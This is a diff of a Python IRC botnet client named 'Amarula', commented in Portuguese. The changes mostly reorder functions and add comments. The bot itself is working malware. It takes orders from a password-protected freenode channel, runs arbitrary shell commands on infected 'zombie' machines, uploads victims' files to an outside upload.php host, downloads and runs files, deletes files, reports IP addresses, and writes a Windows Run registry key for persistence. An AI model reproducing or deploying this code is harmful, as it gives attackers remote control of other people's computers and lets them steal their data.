@@ -1,37 +1,48 @@
 #!/usr/bin/python
-
-import sys
+import glob # For function listArq(): list files on the computer
 import os
-import socket # For function conn(): && ipLocal():
 import platform # For variable pcName
 import random # For variable pcName
-import glob # For function listArq(): list files on the computer
-import re # For function getPublicIp(): Ip Location
-from urllib import urlopen # For function getPublicIp(): Ip Location
 import requests # For function upload(): File Upload
-import urllib,urllib2 # For function download(): downloading files via http
+import re # For function getPublicIp(): Ip Location
+import socket # For function conn(): && ipLocal():
 import subprocess # For function run(): to execute program
+import sys
+from urllib import urlopen # For function getPublicIp(): Ip Location
+import urllib,urllib2 # For function download(): downloading files via http
 import time, datetime# For function screenshot():
+
+
+# ----------------------------------------------------------#
+#				C O N F I G U R A C O E S					#
+# ----------------------------------------------------------#
 
 ircServer= "chat.freenode.net"	# Address Server Irc
 ircChanne= "#amarula4242"			# Channel for Bot connect
 ircPwdCha= "@nolimits42"					# Password of Channel, if there enter the password or leave blank
 botAdmi= "Papa Father"				# A name for the welcome help, Not obligatory.
 botPass= "raise"				# Not obligatory. A name for the welcome help
-dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"	# Path to where the bot will copy + name it, Use \ double to separate directories: \\
+#dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"	# Path to where the bot will copy + name it, Use \ double to separate directories: \\
 urlUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"		# URL that contains the php ARRAY to receive files via upload
 urlStrip = urlUpload.strip('http:upload.php')		# Variable that receives the URL to display uploaded files
 
-def persis():
+# ----------------------------------------------------------#
+#		  F U N C O E S   O P E R A C I O N A I S			#
+# ----------------------------------------------------------#
+
+def conn():
+# Inicia a conexao com o IRC
 
 	try:
-		conv = os.path.realpath(__file__).replace('.py', '.exe')
-		subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Amarula" /t REG_SZ /F /D '+conv, shell=True)
-		EnviaMsg(ircChanne, "[+] Registro alterado com sucesso [+]")
-	except:
-		EnviaMsg(ircChanne, "[+] Nao foi possivel alterar o registro [+]")
+		ircSock.connect((ircServer, 6665)) #6667
+	except socket.error:
+		conn()
+	else:
+		ircSock.send(str.encode("USER "+ botNick +" "+ botNick +" "+ botNick +" :ZuMbI\n"))
+		ircSock.send(str.encode("NICK "+ botNick +"\n"))
 
-def delFileY():
+def deleteFile():
+# Deleta um arquivo
 
 	try:
 		localisfile = glob.glob(delFile)
@@ -41,22 +52,14 @@ def delFileY():
 				EnviaMsg(ircChanne, "[+] Arquivo deletado com sucesso  " + "[ " + localisfile + " ] [+]")
 		else:
 			EnviaMsg(ircChanne, "[!] Ops! O arquivo nao existe " + "[ " + delFile + " ] [!]")
-
 	except WindowsError:
 		EnviaMsg(ircChanne, "[!] Porra! Nao foi possivel deletar o arquivo, provavelmente voce teve permissao negada [!]")
 		EnviaMsg(ircChanne, str(WindowsError))
-def run():
-
-	if os.path.isfile(str(fileRun)) == True:
-		subprocess.call(['start', fileRun], shell=True)
-		EnviaMsg(ircChanne, fileRun + " executado com sucesso.")
-	else:
-		EnviaMsg(ircChanne, fileRun + " arquivo nao existe.")
 
 def download():
-#REFERENCIA http://stackoverflow.com/questions/1096379/how-to-make-urllstarib2-requests-through-tor-in-python
-	if urlDown.find("http://")!= -1 or urlDown.find("https://")!= -1:
+# Faz o download de um arquivo via requisicao HTTP
 
+	if urlDown.find("http://")!= -1 or urlDown.find("https://")!= -1:
 		try:
 			file_name = urlDown.split('/')[-1]
 			u = urllib2.urlopen(urlDown)
@@ -67,35 +70,26 @@ def download():
 			f.write(u.read())
 			f.close()
 			EnviaMsg(ircChanne, "[+] Download finalizado de: " + str(file_name) + " [+]")
-
 		except IOError:
 			EnviaMsg(ircChanne, "[!] Papa, Seu inutil! Voce nao tem privilegio para fazer o download. [!]")
-
 	else:
 		EnviaMsg(ircChanne, "Ops! Tente usar [http://] ou [https://] na URL")
 
-def upload():
-
-	global urlUpload, urlStrip
-
-	if os.path.exists(fileUp):
-		files = {'file': open(fileUp, 'rb')}
-		r = requests.post(urlUpload, files=files) #import requests
-		EnviaMsg(ircChanne, "[+] Upload concluido com sucesso [+] para http:"+urlStrip + fileUp)
-	else:
-		EnviaMsg(ircChanne, "[+] Apenas o vazio da existencia: O arquivo nao existe [+]" + "[ " + fileUp + " ]")
 
 def getPublicIp():
+# Obtem o IP publico do zumbi
 
 	data = str(urlopen('http://checkip.dyndns.com/').read())
 	return re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
 
 def ipLocal():
+# Obtem o IP local do zumbi
 
 	addresses = [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1]
 	return addresses
 
 def listArq():
+# Lista os arquivos do diretorio atual
 
 	file = glob.glob('*.*')
 
@@ -103,7 +97,27 @@ def listArq():
 		EnviaMsg(ircChanne, "Arquivo: [ " + file + " " + str(os.path.getsize(file)) + " kb ]")
 		time.sleep(0.8)
 
+def persis():
+# Cria uma persistencia no registro do Windows
+
+	try:
+		conv = os.path.realpath(__file__).replace('.py', '.exe')
+		subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Amarula" /t REG_SZ /F /D '+conv, shell=True)
+		EnviaMsg(ircChanne, "[+] Registro alterado com sucesso [+]")
+	except:
+		EnviaMsg(ircChanne, "[+] Nao foi possivel alterar o registro [+]")
+
+def run():
+# Executa um arquivo no cliente
+
+	if os.path.isfile(str(fileRun)) == True:
+		subprocess.call(['start', fileRun], shell=True)
+		EnviaMsg(ircChanne, fileRun + " executado com sucesso.")
+	else:
+		EnviaMsg(ircChanne, fileRun + " arquivo nao existe.")
+
 def shell():
+# Habilita comandos shell
 
 	try:
 		process = subprocess.Popen(args=comando,stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell= True)
@@ -132,19 +146,24 @@ def shell():
 			item = item.replace("\xa6", "?")
 			EnviaMsg(ircChanne, item )
 			time.sleep(1)
-
 	except:
 		EnviaMsg(ircChanne, "[!] Ocorreu um erro na execucao do comando [!]")
 
-def conn():
-#REFERENCIA http://stackoverflow.com/questions/25616545/python-irc-bot-not-returning-full-list-of-channels
-	try:
-		ircSock.connect((ircServer, 6665)) #6667
-	except socket.error:
-		conn()
+def upload():
+# Faz o upload de um arquivo do cliente para um servidor HTTP
+
+	global urlUpload, urlStrip
+
+	if os.path.exists(fileUp):
+		files = {'file': open(fileUp, 'rb')}
+		r = requests.post(urlUpload, files=files) #import requests
+		EnviaMsg(ircChanne, "[+] Upload concluido com sucesso [+] para http:"+urlStrip + fileUp)
 	else:
-		ircSock.send(str.encode("USER "+ botNick +" "+ botNick +" "+ botNick +" :ZuMbI\n"))
-		ircSock.send(str.encode("NICK "+ botNick +"\n"))
+		EnviaMsg(ircChanne, "[+] Apenas o vazio da existencia: O arquivo nao existe [+]" + "[ " + fileUp + " ]")
+
+# ----------------------------------------------------------#
+#			F U N C O E S   A U X I L I A R E S				#
+# ----------------------------------------------------------#
 
 def ping():
 	ircSock.send (str.encode("PONG :pingis\n"))
@@ -161,7 +180,13 @@ def leaveChannel(chan):
 def quitIrc(chan):
 	ircSock.send(str.encode("QUIT" + "\n"))
 
+
+# ----------------------------------------------------------#
+#				F U N C A O   P R I N C I P A L				#
+# ----------------------------------------------------------#
+
 def main():
+#Funcao Principal
 
 	global botAdmi, dir, comando, ircSock, botNick, fileUp, urlDown, fileRun, interval, delFile, outt, out2, out3
 
@@ -203,22 +228,23 @@ def main():
 			botNick = pc_name + str(random.randint(1,10000))
 			ircSock.send(str.encode("NICK "+ botNick +"\n"))
 			join(ircChanne)
+
 		if ircMsg.find(str.encode("PING :")) != -1:
 			ping()
+
 		elif ircMsg.find(str.encode("sair")) != -1: # Command used for the bot leave the channel, but remains connected to the irc server
 			leaveChannel(ircChanne)
+
 		elif ircMsg.find(str.encode("matar")) != -1: # Command used for kill bot on irc server
 			quitIrc(ircChanne)
 			sys.exit()
-		elif ircMsg.find(str.encode("help")) != -1: # Command used to display help for the user
 
+		elif ircMsg.find(str.encode("help")) != -1: # Command used to display help for the user
 			try:
 				p = ircMsgClean.split()
 				id = p[4]
-
 			except IndexError:
 				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <help> <" + botNick +">")
-
 			else:
 				if id == botNick:
 					EnviaMsg(ircChanne, "[+] Bem Vindo, Mestre " + botAdmi + " [+]")
@@ -256,6 +282,7 @@ def main():
 			else:
 				if id == botNick:
 					EnviaMsg(ircChanne, "[+] Diretorio atual do zumbi: " + os.getcwd())
+
 		elif ircMsg.find(str.encode("ls")) != -1: # Command to list the files in the current directory
 			try:
 				p = ircMsgClean.split()
@@ -265,6 +292,7 @@ def main():
 			else:
 				if id == botNick:
 					listArq()
+
 		elif ircMsg.find(str.encode("ip")) != -1: # Command to get the host IP
 			try:
 				p = ircMsgClean.split()
@@ -276,6 +304,7 @@ def main():
 					yx = getPublicIp()
 					xy = ipLocal()
 					EnviaMsg(ircChanne, "IP Local: " + str(xy) +  " Ip Externo: " + "['" + yx + "']"  )
+
 		elif ircMsg.find(str.encode("upload")) != -1: # Command to upload files
 			try:
 				p = ircMsgClean.split()
@@ -287,6 +316,7 @@ def main():
 				if fileUp == fileUp and id == botNick:
 					EnviaMsg(ircChanne, "[+] Upload em andamento, aguarde um pouco. [+]")
 					upload()
+
 		elif ircMsg.find(str.encode("download")) != -1: # Command to download files to the host
 			try:
 				p = ircMsgClean.split()
@@ -297,6 +327,7 @@ def main():
 			else:
 				if urlDown == urlDown and id == botNick:
 					download()
+
 		elif ircMsg.find(str.encode("run")) != -1: # Command to execute files on the host
 			try:
 				p = ircMsgClean.split()
@@ -317,7 +348,7 @@ def main():
 				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <delete> <arquivo> <"+ botNick +">")
 			else:
 				if delFile == delFile and id == botNick:
-					delFileY()
+					deleteFile()
 
 		elif ircMsg.find(str.encode("shell")) != -1:  # Command to execute files on the host
 			try:
@@ -333,6 +364,7 @@ def main():
 			else:
 				if comando == comando and id == botNick:
 					shell()
+
 		elif ircMsg.find(str.encode("persistence")) != -1: # Para persistencia
 			try:
 				p = ircMsgClean.split()
@@ -342,5 +374,6 @@ def main():
 			else:
 				if id == botNick:
 					persis()
+
 if __name__ == "__main__":
 	main()
